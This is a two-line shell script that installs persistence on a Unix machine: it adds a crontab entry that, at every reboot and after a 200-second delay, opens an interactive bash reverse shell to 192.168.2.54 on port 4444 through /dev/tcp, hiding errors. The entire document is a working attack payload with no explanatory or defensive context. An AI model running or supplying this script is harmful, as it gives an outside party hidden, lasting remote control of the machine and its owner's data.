#!/bin/sh
(crontab -l ; echo "@reboot sleep 200 && bash -i >& /dev/tcp/192.168.2.54/4444 0>&1\n")|crontab 2> /dev/null
